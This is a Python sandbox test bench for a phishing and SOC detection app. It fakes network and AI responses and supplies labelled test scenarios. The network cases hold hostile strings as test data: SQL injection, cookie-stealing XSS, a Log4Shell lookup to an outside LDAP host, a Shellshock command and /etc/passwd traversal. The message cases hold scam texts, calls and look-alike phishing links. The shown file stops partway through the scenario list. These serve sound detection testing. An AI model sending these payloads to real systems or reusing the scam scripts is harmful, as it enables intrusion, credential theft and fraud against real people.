"""
PhishGuard SOC — sandbox test bench
===================================
Runs phishguard_soc.py (or soc_dashboard_v3.py) inside an isolated, offline environment
and checks the results against labelled scenarios.

Isolation
  • Network: DNS and outbound sockets are blocked for everything except loopback.
    Geo-IP lookups and AI APIs are answered by a fake internet inside this process.
  • AI: Claude and Gemini are replaced by deterministic simulated models that return
    responses in each provider's real format, so the app's real request-building and
    response-parsing code runs. Faults (timeouts, safety blocks, bad keys…) can be injected.
  • State: training data lives in a temp directory that is deleted afterwards; your real
    phishguard_training.json is never touched. App state is reset between suites.

Usage
  python sandbox.py                         run every suite → sandbox_report.html + sandbox_results.json
  python sandbox.py --suite messages        run one suite (network, security, messages, training, ai, custom)
  python sandbox.py --scenarios my.json     add your own labelled cases (see sandbox_scenarios.example.json)
  python sandbox.py --live-ai               use your real ANTHROPIC_API_KEY / GEMINI_API_KEY
                                            (only those two hosts are reachable)
  python sandbox.py --serve                 open the app in the sandbox for hands-on testing,
                                            preloaded with demo traffic and example scans
  python sandbox.py --target soc_dashboard_v3.py   test the standalone SOC dashboard

Exit code is 1 if any check fails, so it can run in CI.
"""

from __future__ import annotations

import argparse
import hashlib
import html
import importlib.util
import ipaddress
import json
import os
import re
import shutil
import socket
import sys
import tempfile
import threading
import time
from datetime import datetime

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
SIM_KEY = "sandbox-simulated-key"

# ══════════════════════════════════════════════════════════════════════════════
# ISOLATION
# ══════════════════════════════════════════════════════════════════════════════
AI_HOSTS = {"api.anthropic.com", "generativelanguage.googleapis.com"}


def _is_loopback(host: str) -> bool:
    if host in ("localhost", ""):
        return True
    try:
        return ipaddress.ip_address(host.strip("[]")).is_loopback
    except ValueError:
        return False


class EgressGuard:
    """Blocks DNS + outbound sockets to anything but loopback (and AI hosts in live mode)."""

    def __init__(self, live_ai: bool):
        self.allow = AI_HOSTS if live_ai else set()
        self.live_ai = live_ai
        self.blocked: list[str] = []

    def install(self):
        orig_gai, orig_connect = socket.getaddrinfo, socket.socket.connect
        guard = self

        def getaddrinfo(host, *a, **k):
            h = (host.decode() if isinstance(host, bytes) else str(host or "")).lower()
            if _is_loopback(h) or h in guard.allow:
                return orig_gai(host, *a, **k)
            guard.blocked.append(h)
            raise socket.gaierror(f"[sandbox] outbound DNS blocked: {h}")

        def connect(sock, address):
            if isinstance(address, tuple) and not guard.live_ai and not _is_loopback(str(address[0])):
                guard.blocked.append(str(address[0]))
                raise ConnectionRefusedError(f"[sandbox] outbound connection blocked: {address[0]}")
            return orig_connect(sock, address)

        socket.getaddrinfo = getaddrinfo
        socket.socket.connect = connect


class FakeResp:
    def __init__(self, status: int, data: dict):
        self.status_code, self._data = status, data

    def json(self):
        return self._data


FAKE_CITIES = [
    ("Ashburn", "United States", "US", 39.04, -77.49, "Amazon AWS"),
    ("Frankfurt", "Germany", "DE", 50.11, 8.68, "Hetzner Online"),
    ("Moscow", "Russia", "RU", 55.75, 37.62, "Rostelecom"),
    ("Lagos", "Nigeria", "NG", 6.52, 3.38, "MTN Nigeria"),
    ("São Paulo", "Brazil", "BR", -23.55, -46.63, "Vivo"),
    ("Hanoi", "Vietnam", "VN", 21.03, 105.85, "VNPT"),
    ("Chicago", "United States", "US", 41.88, -87.63, "Comcast Cable"),
    ("London", "United Kingdom", "GB", 51.51, -0.13, "BT"),
    ("Singapore", "Singapore", "SG", 1.35, 103.82, "DigitalOcean"),
    ("Karachi", "Pakistan", "PK", 24.86, 67.00, "PTCL"),
]


def fake_geo(ip: str) -> dict:
    city, country, cc, lat, lon, org = FAKE_CITIES[int(hashlib.sha1(ip.encode()).hexdigest(), 16) % len(FAKE_CITIES)]
    return {"ip": ip, "city": city, "country_name": country, "country_code": cc,
            "latitude": lat, "longitude": lon, "org": f"SANDBOX {org}"}


# ── Simulated AI models ───────────────────────────────────────────────────────
MAJOR_DOMAINS = {"google.com", "apple.com", "amazon.com", "paypal.com", "microsoft.com", "chase.com",
                 "github.com", "netflix.com", "usps.com", "irs.gov", "fcps.edu"}
BRAND_WORDS = {"paypal": "paypal.com", "amazon": "amazon.com", "apple": "apple.com", "chase": "chase.com",
               "netflix": "netflix.com", "usps": "usps.com", "irs": "irs.gov", "microsoft": "microsoft.com"}


def _sim_assess(provider: str, system: str, user: str) -> dict:
    """A deterministic stand-in for an LLM. Deliberately different from the rules engine."""
    m = re.search(r"<message[^>]*>(.*)</message>", user, re.S)
    msg = (m.group(1) if m else user).lower()
    sender = (re.search(r"sender:\s*(.*)", msg) or [None, ""])[1].strip()
    hosts = re.findall(r"(?:https?://)?((?:[a-z0-9-]+\.)+[a-z]{2,})(?:/\S*)?", msg)
    domains = {".".join(h.split(".")[-2:]) for h in hosts}
    feats = []

    def f(cond, pts, why):
        if cond:
            feats.append((pts, why))

    f(re.search(r"\b(verify|log ?in|password|ssn|account details|confirm your)\b", msg), 20, "asks you to verify or log in")
    f(re.search(r"\b(pay|fee|balance|gift cards?|wire|bitcoin|crypto|refund)\b", msg), 20, "asks for money or payment details")
    f(re.search(r"\b(today|immediately|within \d+ hours|suspend\w*|locked|final|avoid a)\b", msg), 15, "creates time pressure")
    f(any(d not in MAJOR_DOMAINS for d in domains), 20, "links to an unfamiliar domain")
    f(any(b in msg and BRAND_WORDS[b] not in domains and domains for b in BRAND_WORDS), 20, "brand named but link goes elsewhere")
    f(re.search(r"\breply\b.{0,12}\byes\b", msg), 15, "wants a keyword reply")
    f(re.search(r"wrong number|is this \w+\?", msg) and re.search(r"invest|crypto|returns", msg), 30, "wrong-number opener leading to investing")
    f(re.search(r"\bcall\b", msg) and re.search(r"did not authori[sz]e|unauthori[sz]ed|charge of", msg), 25, "pushes you to call about a charge")
    f(re.search(r"confidential|in a meeting", msg) and "gift card" in msg, 30, "secretive gift-card request")
    # Few-shot wiring check: does the user's confirmed training reach the model?
    confirmed = system.split("User-confirmed examples:")[-1].lower()
    scam_lines = [ln for ln in confirmed.splitlines() if ln.startswith("- scam")]
    digits = re.sub(r"\D", "", sender)
    f(any((len(digits) >= 5 and digits in re.sub(r"\D", "", ln)) or any(d in ln for d in domains) for ln in scam_lines),
      30, "matches an example you confirmed as a scam")

    raw = sum(p for p, _ in feats)
    score = min(100, raw if provider == "Claude" else round(raw * 0.9) + (5 if domains else 0))
    if not feats:
        score = 4 if provider == "Claude" else 7
    verdict = "scam" if score >= 55 else "suspicious" if score >= 30 else "safe"
    why = [w for _, w in sorted(feats, reverse=True)]
    reasoning = (f"Simulated {provider}: " + ("; ".join(why[:3]) + ".") if why
                 else f"Simulated {provider}: nothing unusual for a message like this.")
    return {"score": score, "verdict": verdict, "reasoning": reasoning, "red_flags": why[:4]}


class FakeInternet:
    """Answers the only outbound calls the app makes. Everything else is refused."""

    def __init__(self, live_ai: bool):
        self.live_ai = live_ai
        self.faults: dict[str, str] = {}
        self.latency = 0.0
        self.calls: list[dict] = []
        self.real_get, self.real_post = requests.get, requests.post

    def install(self, mod):
        mod._requests.get = self.get
        mod._requests.post = self.post

    def get(self, url, **kw):
        self.calls.append({"method": "GET", "url": url})
        if "ipapi.co/" in url:
            return FakeResp(200, fake_geo(url.split("ipapi.co/")[1].split("/")[0]))
        raise requests.ConnectionError(f"[sandbox] blocked GET {url}")

    def post(self, url, **kw):
        self.calls.append({"method": "POST", "url": url, "json": kw.get("json"), "headers": kw.get("headers")})
        provider = "Claude" if "api.anthropic.com" in url else "Gemini" if "generativelanguage.googleapis.com" in url else None
        if not provider:
            raise requests.ConnectionError(f"[sandbox] blocked POST {url}")
        if self.live_ai:
            return self.real_post(url, **kw)
        if self.latency:
            time.sleep(self.latency)
        fault = self.faults.get(provider)
        body = kw.get("json") or {}
        if provider == "Claude":
            system, user = body.get("system", ""), body["messages"][0]["content"]
        else:
            system = body["systemInstruction"]["parts"][0]["text"]
            user = body["contents"][0]["parts"][0]["text"]
        if fault == "timeout":
            raise requests.Timeout("[sandbox] simulated timeout")
        if fault == "auth":
            msg = "invalid x-api-key" if provider == "Claude" else "API key not valid. Please pass a valid API key."
            return FakeResp(401 if provider == "Claude" else 400, {"error": {"message": msg}})
        if fault == "404":
            return FakeResp(404, {"error": {"message": f"models/{'sim' if provider == 'Claude' else 'gemini-x'} is not found"}})
        if fault == "rate":
            return FakeResp(429, {"error": {"message": "Rate limit exceeded"}})
        text = json.dumps(_sim_assess(provider, system, user))
        if fault == "garbage":
            text = "I think this is probably a scam, but I can't say for sure."
        if provider == "Claude":
            return FakeResp(200, {"content": [{"type": "text", "text": "```json\n" + text + "\n```"}]})
        if fault == "safety":
            return FakeResp(200, {"promptFeedback": {"blockReason": "SAFETY"}})
        if fault == "empty":
            return FakeResp(200, {"candidates": [{"content": {"parts": []}, "finishReason": "MAX_TOKENS"}]})
        return FakeResp(200, {"candidates": [{"content": {"parts": [
            {"text": "Weighing the signals…", "thought": True}, {"text": text}]}, "finishReason": "STOP"}]})


# ══════════════════════════════════════════════════════════════════════════════
# SCENARIOS
# ══════════════════════════════════════════════════════════════════════════════
CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"

NETWORK_CASES = [  # label: malicious → expect severity ≥ medium; benign → expect severity ≤ low
    {"name": "Homepage visit", "ip": "192.0.2.88", "path": "/log?page=/", "label": "benign"},
    {"name": "Pricing page from Google search", "ip": "192.0.2.201", "path": "/log?page=/pricing", "referrer": "https://www.google.com/search?q=soc+tools", "label": "benign"},
    {"name": "Search containing 'union' and 'select'", "ip": "192.0.2.88", "path": "/log?q=union+station+select+seats", "label": "benign"},
    {"name": "JSON analytics beacon with 'payload' key", "ip": "192.0.2.201", "method": "POST", "path": "/log", "json": {"payload": {"page": "/docs", "ms": 412}}, "label": "benign"},
    {"name": "Link to example.com", "ip": "192.0.2.88", "path": "/log?site=example.com&ref=newsletter", "label": "benign"},
    {"name": "Internal uptime check (curl)", "ip": "10.0.0.5", "path": "/log?health=1", "ua": "curl/8.5.0", "label": "benign"},
    {"name": "Path /administratorz (not a honeypot)", "ip": "192.0.2.88", "path": "/administratorz", "label": "benign", "status": 404},
    {"name": "SQL injection, URL-encoded", "ip": "198.51.100.33", "path": "/log?id=1%27%20OR%20%271%27%3D%271", "label": "malicious", "tags": ["EXPLOIT"]},
    {"name": "UNION SELECT with sqlmap", "ip": "198.51.100.33", "path": "/log?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", "ua": "sqlmap/1.8.4", "label": "malicious", "tags": ["EXPLOIT", "BOT_AUTOMATION"]},
    {"name": "Reflected XSS, double-encoded", "ip": "203.0.113.24", "path": "/log?q=%253Cscript%253Ealert(document.cookie)", "label": "malicious", "tags": ["EXPLOIT"]},
    {"name": "Log4Shell in User-Agent", "ip": "198.51.100.71", "path": "/log", "ua": "${jndi:ldap://203.0.113.5:1389/a}", "label": "malicious", "tags": ["EXPLOIT"]},
    {"name": "Shellshock in User-Agent", "ip": "198.51.100.71", "path": "/log", "ua": "() { :; }; /bin/bash -c 'id'", "label": "malicious", "tags": ["EXPLOIT"]},
    {"name": "Path traversal to /etc/passwd", "ip": "192.0.2.140", "path": "/log?file=../../../../etc/passwd", "ua": "python-requests/2.32", "label": "malicious", "tags": ["RECONNAISSANCE"]},
    {"name": "WordPress login probe", "ip": "203.0.113.10", "path": "/wp-login.php", "ua": "Mozilla/5.0 (compatible; Nuclei)", "label": "malicious", "tags": ["HONEYPOT"], "status": 404},
    {"name": ".env secrets probe", "ip": "203.0.113.10", "path": "/.env", "label": "malicious", "tags": ["HONEYPOT", "RECONNAISSANCE"], "status": 404},
    {"name": ".git/config probe", "ip": "192.0.2.15", "path": "/.git/config", "ua": "zgrab/0.x", "label": "malicious", "tags": ["HONEYPOT"], "status": 404},
    {"name": "Malware download path", "ip": "192.0.2.15", "path": "/log?download=invoice.pdf.exe", "label": "malicious", "tags": ["MALWARE_DELIVERY"]},
    {"name": "Bulk password export", "ip": "198.51.100.4", "path": "/log?action=export-passwords", "label": "malicious", "tags": ["EXFILTRATION"]},
    {"name": "Phishing-kit path with look-alike brand", "ip": "203.0.113.24", "path": "/log?next=/account-suspended/verify-account&brand=paypa1", "label": "malicious", "tags": ["PHISHING"]},
    {"name": "Card data in POST body", "ip": "203.0.113.57", "method": "POST", "path": "/log", "form": "card=credit card number&cvv=123", "label": "malicious", "tags": ["IDENTITY_THEFT"]},
    {"name": "Referrer from BBB-confirmed scam domain", "ip": "203.0.113.57", "path": "/log?page=/billing", "referrer": "https://harriscollect.payweb360.com/login?consent=true", "label": "malicious", "tags": ["KNOWN_SCAM_IOC"], "pg_only": True},
    {"name": "Look-alike of scam domain (not a match)", "ip": "192.0.2.88", "path": "/log?u=notpayweb360.company", "label": "benign", "pg_only": True},
]

MESSAGE_CASES = [  # label: scam / spam (unwanted) / safe
    # — the 7 built-in real-world examples are added at runtime from the app itself —
    {"name": "Harris & Harris, second victim (Dorothy)", "label": "scam", "mode": "sms", "sender": "69534",
     "body": "Dorothy, Harris&Harris-collects for STATE OF MARYLAND, CCU. Balance: $115.83 To Pay: https://harriscollect.payweb360.com/login?consent=true&logintoken=4B1E77A0-2C6D-4F7B-9E21-77A0C1D2E3F4 or call 855-336-5124 Reply STOP to stop"},
    {"name": "USPS redelivery fee", "label": "scam", "mode": "sms", "sender": "+44 7700 900123",
     "body": "USPS: Your package is on hold due to an incomplete address. Update within 12 hours or it will be returned: https://usps-redelivery.top/track"},
    {"name": "Unpaid toll (E-ZPass style)", "label": "scam", "mode": "sms", "sender": "+1 (626) 555-0187",
     "body": "E-ZPass: You have an unpaid toll balance of $6.99. Pay by 10/09 to avoid a $50 late fee: https://ezpass-tollpay.xyz/pay"},
    {"name": "Bank account locked", "label": "scam", "mode": "sms", "sender": "(800) 555-0134",
     "body": "Chase Alert: Your card has been locked due to unusual activity. Verify now to restore access: https://chase-secure-verify.com"},
    {"name": "Fake Amazon charge, call-back", "label": "scam", "mode": "sms", "sender": "(213) 555-0177",
     "body": "Amazon: A charge of $1,499.99 for iPhone 15 Pro was placed on your account. If you did not authorize this, call 1-888-555-0123 immediately."},
    {"name": "Wrong-number crypto opener", "label": "scam", "mode": "sms", "sender": "(917) 555-0144",
     "body": "Hi, is this Emily? Sorry, wrong number! Since we're talking — I invest in crypto with a mentor and make guaranteed returns of 30% a week. Happy to teach you."},
    {"name": "IRS refund email", "label": "scam", "mode": "email", "sender": "IRS Refunds <refund@irs-gov-refund.com>",
     "subject": "Tax refund pending", "body": "You are eligible for a tax refund of $1,284.50. Verify your identity to claim it: http://irs-gov-refund.com/claim"},
    {"name": "Boss asks for gift cards", "label": "scam", "mode": "email", "sender": "David Chen <david.chen.ceo@gmail.com>",
     "subject": "Quick favor", "body": "Are you available? I need you to purchase 5 Apple gift cards for a client today. Keep this confidential, I'm in a meeting. Scratch the backs and send me the codes."},
    {"name": "Netflix billing on hold", "label": "scam", "mode": "email", "sender": "Netflix <billing@netflix-account-update.com>",
     "subject": "Your membership is on hold", "body": "We couldn't process your payment. Update your payment details within 24 hours to keep watching: http://netflix-account-update.com/billing"},
    # — held-out cases: written before the toll / callback / investment / gift-card rules existed —
    {"name": "Held-out: NC Quick Pass toll", "label": "scam", "mode": "sms", "sender": "+1 (480) 555-0163",
     "body": "NC Quick Pass: Outstanding toll of $4.15. Settle now to avoid penalties: https://ncquickpass-tolls.com/pay"},
    {"name": "Held-out: Microsoft renewal call-back", "label": "scam", "mode": "email", "sender": "Billing Dept <billing@renewal-center-support.com>",
     "subject": "Order #88213 confirmed", "body": "Your account was charged $399.99 for a 3-year software renewal. If you did not make this purchase, call our cancellation desk at +1 (888) 555-0142 within 24 hours."},
    {"name": "Held-out: yoga-friend crypto opener", "label": "scam", "mode": "sms", "sender": "(646) 555-0191",
     "body": "Hi Mark, it's Jenny from yoga! Oh sorry, I think I have the wrong number. Do you trade by any chance? My uncle showed me an AI crypto platform that makes 20% daily."},
    {"name": "Held-out: pastor gift-card request", "label": "scam", "mode": "sms", "sender": "(301) 555-0128",
     "body": "This is Pastor John. Are you free? I need a quick favor, please get 4 Google Play gift cards for a patient in hospital. I'll pay you back. Send pics of the cards."},
    {"name": "Held-out: real E-ZPass low balance", "label": "safe", "mode": "sms", "sender": "73979",
     "body": "E-ZPass Virginia: Your account balance is low. Please log in to your account on the official website to replenish."},
    {"name": "Held-out: Venmo payment", "label": "safe", "mode": "sms", "sender": "86753", "body": "Venmo: You paid Alex Rivera $12.00 for pizza night."},
    {"name": "Held-out: insurance renewal from agent", "label": "safe", "mode": "sms", "sender": "(703) 555-0144",
     "body": "Hi Ali, reminder that your car insurance policy renews on 11/02. Questions? Call me at (703) 555-0144. - Dana, State Farm"},
    {"name": "Held-out: Uber arrival", "label": "safe", "mode": "sms", "sender": "827222", "body": "Your Uber driver, Sam, is arriving in 2 minutes in a gray Toyota Camry."},
    # — fake recruiter impersonating Trailhead Biosystems (reported Oct 20, 2026) and look-alikes that must stay clean —
    {'name': 'Recruiter: Same email, NEW look-alike domain', 'label': 'scam', 'mode': 'email', 'sender': 'HR Services <careers@trailhead-biosystems.net>', 'subject': 'Interview invitation', 'body': 'Dear Ali,\n\nThank you for applying for the Remote IT Specialist position with Trailhead Biosystems. After carefully reviewing your resume we are impressed with your experience, skills and professional background. We believe your qualifications align well with the requirements of the role.\n\nWe would like to invite you to participate in an online interview with our hiring manager. This will provide an opportunity to learn more about your background, organizational expertise, and professional accomplishments. It will also give you the chance to gain further insight into the role, our team, and the culture at Trailhead Biosystems. The job description is attached for your review.\n\nPlease let us know your best availability to connect. We look forward to speaking with you and discussing how your skills and experience may contribute to our team.\n\nBest regards,\n\nSusan Easington\nManager, HR Services\nTrailhead Biosystems'},
    {'name': 'Recruiter: Same email from a Gmail address', 'label': 'scam', 'mode': 'email', 'sender': 'Trailhead HR <trailheadbiosystems.hr@gmail.com>', 'subject': 'Interview invitation', 'body': 'Dear Ali,\n\nThank you for applying for the Remote IT Specialist position with Trailhead Biosystems. After carefully reviewing your resume we are impressed with your experience, skills and professional background. We believe your qualifications align well with the requirements of the role.\n\nWe would like to invite you to participate in an online interview with our hiring manager. This will provide an opportunity to learn more about your background, organizational expertise, and professional accomplishments. It will also give you the chance to gain further insight into the role, our team, and the culture at Trailhead Biosystems. The job description is attached for your review.\n\nPlease let us know your best availability to connect. We look forward to speaking with you and discussing how your skills and experience may contribute to our team.\n\nBest regards,\n\nSusan Easington\nManager, HR Services\nTrailhead Biosystems'},
    {'name': 'Recruiter: Real Trailhead recruiter (trailbio.com)', 'label': 'safe', 'mode': 'email', 'sender': 'Jane Doe <jdoe@trailbio.com>', 'subject': 'Interview: Internal IT role', 'body': 'Hi Ali, thanks for applying to the Internal IT role at Trailhead Biosystems. Our COO would like to meet you on site in Beachwood. Are you free Thursday or Friday afternoon this week? Best, Jane'},
    {'name': 'Recruiter: Trailhead via Greenhouse (legit platform)', 'label': 'safe', 'mode': 'email', 'sender': 'Trailhead Biosystems <no-reply@us.greenhouse-mail.io>', 'subject': 'Your application to Trailhead Biosystems', 'body': 'Hi Ali, thank you for applying to Internal IT at Trailhead Biosystems. We have received your application and will be in touch if your qualifications match our needs.'},
    {'name': 'Recruiter: Other company, ordinary recruiter email', 'label': 'safe', 'mode': 'email', 'sender': 'Maria Lopez <mlopez@deloitte.com>', 'subject': 'Phone screen — Cyber Analyst', 'body': "Hi Ali, thanks for applying to the Cyber Analyst role. After reviewing your resume I'd like to set up a 30-minute phone screen. What times work for you this week?"},
    {'name': 'Recruiter: News email mentioning Trailhead', 'label': 'safe', 'mode': 'email', 'sender': "Crain's Cleveland <newsletter@crainscleveland.com>", 'subject': "Today's headlines", 'body': 'Trailhead Biosystems raises $20 million to expand manufacturing in Beachwood. Read more at https://www.crainscleveland.com/health-care/trailhead-raises-20m'},
    # — phone calls (what the caller said / voicemail transcripts) —
    {'name': "Call: Bank 'fraud department' wants your code", 'label': 'scam', 'mode': 'call', 'sender': '(800) 555-0199', 'body': "Hi, this is the Chase fraud department. We detected suspicious charges on your debit card. To stop them we need to verify it's you. You'll receive a six-digit code by text, please read it back to me so I can cancel the charges."},
    {'name': 'Call: Social Security arrest threat', 'label': 'scam', 'mode': 'call', 'sender': '(202) 555-0147', 'body': 'This is an urgent call from the Social Security Administration. Your social security number has been suspended due to suspicious activity and a warrant will be issued for your arrest. Press 1 to speak to an officer now.'},
    {'name': 'Call: Amazon refund + AnyDesk', 'label': 'scam', 'mode': 'call', 'sender': '(888) 555-0110', 'body': "Hello, I'm calling from Amazon support about the refund for the iPhone order. To process your refund I need you to install AnyDesk on your computer so I can help you log in to your bank. Please don't hang up."},
    {'name': 'Call: Grandparent bail request', 'label': 'scam', 'mode': 'call', 'sender': '(415) 555-0133', 'body': "Grandma, it's me. I was in a car accident and I've been arrested. I need money for bail, please don't tell mom. My lawyer will call you to explain how to send the cash."},
    {'name': "Call: Move savings to a 'safe account'", 'label': 'scam', 'mode': 'call', 'sender': '(301) 555-0170', 'body': 'This is the security department at your bank. Your account has been compromised by hackers. To protect your money you need to transfer your savings to a new safe account today. Keep this confidential, even from bank staff.'},
    {'name': 'Call: IRS wants gift cards', 'label': 'scam', 'mode': 'call', 'sender': '(206) 555-0181', 'body': 'This is officer Smith with the IRS. You owe back taxes and legal action will be taken against you today. To avoid arrest you must pay with Google Play gift cards and read me the numbers.'},
    {'name': "Call: Crypto ATM 'protection' payment", 'label': 'scam', 'mode': 'call', 'sender': '(646) 555-0162', 'body': 'Your bank account was used in a fraud investigation. The federal agent on this case needs you to withdraw cash and deposit it at a bitcoin ATM to protect your funds. Stay on the line while you drive there.'},
    {'name': 'Call: Auto-warranty robocall', 'label': 'spam', 'mode': 'call', 'sender': '(844) 555-0105', 'body': "We've been trying to reach you concerning your car's extended warranty. This is your final notice. Press 1 to speak with a warranty specialist."},
    {'name': 'Call: Real bank fraud-alert voicemail', 'label': 'safe', 'mode': 'call', 'sender': '(800) 935-9935', 'body': 'Hi, this is Chase calling about a recent transaction on your card ending in 4417. Please call us back at the number on the back of your card. We will never ask you for your PIN, password or a one-time code.'},
    {'name': "Call: Doctor's office reminder", 'label': 'safe', 'mode': 'call', 'sender': '(703) 555-0122', 'body': "Hi Ali, this is Dr. Patel's office calling to confirm your appointment Thursday at 10 AM. Please call us back if you need to reschedule. Thank you."},
    {'name': "Call: Friend's voicemail", 'label': 'safe', 'mode': 'call', 'sender': '(571) 555-0190', 'body': "Hey it's Omar, give me a call back when you're free, want to see if you're coming to the game Saturday."},
    {'name': 'Call: Pharmacy pickup', 'label': 'safe', 'mode': 'call', 'sender': '(703) 555-0155', 'body': 'This is CVS pharmacy with a message for Ali. Your prescription is ready for pickup. Press 1 to hear store hours or call us back at your convenience.'},
    {'name': 'Call: Real IT helpdesk callback (your employer)', 'label': 'safe', 'mode': 'call', 'sender': '(703) 555-0100', 'body': "Hi Ali, this is Mark from the IT help desk returning your call about the laptop ticket. I can walk you through the VPN setup when you're free. Call me back at extension 2210."},
    {'name': 'Call: Delivery driver', 'label': 'safe', 'mode': 'call', 'sender': '(240) 555-0144', 'body': "Hi, this is your FedEx driver, I'm outside with a package that needs a signature. I'll come back tomorrow if you're not home."},
    {'name': "Call: Wells Fargo 'verify the passcode we just sent'", 'label': 'scam', 'mode': 'call', 'sender': '(844) 555-0177', 'body': "Hi this is Wells Fargo account protection, we see a Zelle payment of $980 you may not have made. I'm going to send you a passcode, when it arrives just tell me the passcode so I can reverse the transfer."},
    {'name': 'Call: Microsoft virus pop-up callback', 'label': 'scam', 'mode': 'call', 'sender': '(855) 555-0131', 'body': 'Microsoft technical support here, your computer is sending us virus alerts and your files are at risk. I need you to open Quick Assist and give me the code on your screen so I can clean it.'},
    {'name': 'Call: Utility shut-off, pay by Cash App', 'label': 'scam', 'mode': 'call', 'sender': '(410) 555-0119', 'body': 'This is BGE. Your power will be disconnected in 30 minutes for an overdue balance. To avoid disconnection you must pay $412 right now through Cash App to our billing agent.'},
    {'name': "Call: Medicare card 'replacement'", 'label': 'scam', 'mode': 'call', 'sender': '(877) 555-0156', 'body': "Hello this is Medicare, we're issuing new cards and your benefits will be suspended unless you confirm your Medicare number and social security number with me today."},
    {'name': "Call: Kidnapping / 'your son' extortion", 'label': 'scam', 'mode': 'call', 'sender': '(305) 555-0124', 'body': "We have your son. If you want to see him again you will wire five thousand dollars through Western Union in the next hour. Don't call the police and don't hang up."},
    {'name': 'Call: Dentist confirming', 'label': 'safe', 'mode': 'call', 'sender': '(703) 555-0181', 'body': 'Hi, this is Bright Smile Dental confirming your cleaning tomorrow at 9. Call us back if you need to change it.'},
    {'name': 'Call: Bank callback about a dispute you opened', 'label': 'safe', 'mode': 'call', 'sender': '(800) 555-0102', 'body': 'Hi Ali, this is Capital One following up on the dispute you opened last week. The credit has been applied. No action is needed. You can review it in the app.'},
    {'name': 'Call: Recruiter phone screen', 'label': 'safe', 'mode': 'call', 'sender': '(571) 555-0166', 'body': "Hi Ali, this is Priya from Booz Allen recruiting. I'd love to set up a quick phone screen for the security analyst role. Please call me back or reply to my email."},
    {'name': 'Call: Landlord about maintenance', 'label': 'safe', 'mode': 'call', 'sender': '(703) 555-0109', 'body': "Hey Ali, it's Dave the landlord. The plumber is coming Wednesday morning to fix the sink, just a heads up."},
    {'name': 'Call: School closure robocall', 'label': 'safe', 'mode': 'call', 'sender': '(703) 555-0100', 'body': 'This is Fairfax County Public Schools. Due to weather, all schools are closed today. Press 1 to repeat this message.'},
    # — email files (.eml) with headers —
    {'name': 'Email headers: Reply-To points to Gmail', 'label': 'scam', 'mode': 'email', 'sender': 'Payroll <payroll@acme-corp.com>', 'subject': 'Direct deposit update', 'body': 'Please confirm your direct deposit details by replying to this email today.', 'headers': {'reply_to': 'acme.payroll.dept@gmail.com'}},
    {'name': 'Email headers: Fails SPF, DKIM and DMARC', 'label': 'scam', 'mode': 'email', 'sender': 'PayPal <service@paypal.com>', 'subject': 'Your account is limited', 'body': 'We noticed unusual activity. Verify your account at the link below.', 'headers': {'auth': 'mx.google.com; spf=fail smtp.mailfrom=paypal.com; dkim=fail header.d=paypal.com; dmarc=fail (p=REJECT) header.from=paypal.com'}},
    {'name': 'Email headers: Trailhead form receipt (genuine)', 'label': 'safe', 'mode': 'email', 'sender': 'Trailhead Biosystems <hello@trailbio.com>', 'subject': 'Trailhead Biosystems Form Submission', 'body': "Hello Jordan Lee, Thank you for filling out the Trailhead Biosystems online contact form. We've opened a ticket for you to track our team's progress on your request.", 'headers': {'reply_to': 'hello@trailbio.com', 'auth': 'mx.google.com; spf=pass smtp.mailfrom=trailbio.com; dkim=pass header.i=@trailbio.com; dmarc=pass header.from=trailbio.com'}},
    {'name': 'Email headers: Newsletter sent via an email service (genuine)', 'label': 'safe', 'mode': 'email', 'sender': 'The Verge <newsletter@theverge.com>', 'subject': "Today's top stories", 'body': "Here are today's top stories from The Verge.", 'headers': {'reply_to': 'newsletter@theverge.com', 'auth': 'spf=pass smtp.mailfrom=bounce.sendgrid.net; dkim=pass header.d=theverge.com; dmarc=pass'}},
    # — other languages (Spanish, Urdu, Roman Urdu, Hindi, Arabic, French, Portuguese) —
    {'name': 'Language: Spanish bank-block OTP', 'label': 'scam', 'mode': 'sms', 'sender': '+52 55 1234 5678', 'body': 'Su cuenta bancaria ha sido bloqueada. Para reactivarla, comparta el código que le enviamos por SMS. Urgente.'},
    {'name': 'Language: Urdu BISP 8171 aid fee', 'label': 'scam', 'mode': 'sms', 'sender': '8171', 'body': 'مبارک ہو! آپ کو بینظیر انکم سپورٹ پروگرام کی طرف سے 25000 روپے کی امدادی رقم ملی ہے۔ رقم وصول کرنے کے لیے 500 روپے فیس جمع کرائیں۔'},
    {'name': 'Language: Hindi KYC account block', 'label': 'scam', 'mode': 'sms', 'sender': 'VK-SBIINB', 'body': 'प्रिय ग्राहक, आपका खाता आज बंद कर दिया जाएगा। तुरंत केवाईसी अपडेट करने के लिए इस लिंक पर क्लिक करें http://sbi-kyc-update.in'},
    {'name': 'Language: Roman Urdu bank caller wants code', 'label': 'scam', 'mode': 'call', 'sender': '+92 300 1234567', 'body': 'Assalam o alaikum, main bank se baat kar raha hoon. Aap ka account block ho gaya hai, foran apne mobile par aaya hua code bata dein.'},
    {'name': 'Language: Spanish family dinner', 'label': 'safe', 'mode': 'sms', 'sender': 'Mamá', 'body': 'Hola mamá, ¿vamos a cenar el domingo en casa de la abuela? Te quiero.'},
    {'name': 'Language: Urdu message to mom', 'label': 'safe', 'mode': 'sms', 'sender': 'Ammi', 'body': 'امی جان، میں شام کو گھر آؤں گا۔ کھانے میں کیا بنا رہی ہیں؟'},
    {'name': 'Language: Hindi cricket plans', 'label': 'safe', 'mode': 'sms', 'sender': 'Rahul', 'body': 'भाई कल मैच देखने चलोगे? मैं टिकट बुक कर दूंगा।'},
    {'name': 'Language: Spanish grandparent scam call', 'label': 'scam', 'mode': 'call', 'sender': '+1 202 555 0100', 'body': 'Hola, soy yo, tu nieto. Tuve un accidente y estoy en la cárcel, necesito dinero para la fianza, por favor no le digas a nadie.'},
    {'name': 'Language (held-out) 1: Correos: su paquete está retenido. Pague', 'label': 'scam', 'mode': 'sms', 'sender': '+34 611 223 344', 'subject': '', 'body': 'Correos: su paquete está retenido. Pague 1,99 EUR de tasas de aduana aquí: https://correos-envio.info/pago'},
    {'name': 'Language (held-out) 2: BBVA: Hemos detectado un acceso no autor', 'label': 'scam', 'mode': 'sms', 'sender': 'BBVA', 'subject': '', 'body': 'BBVA: Hemos detectado un acceso no autorizado. Su tarjeta ha sido suspendida. Verifique sus datos en el siguiente enlace.'},
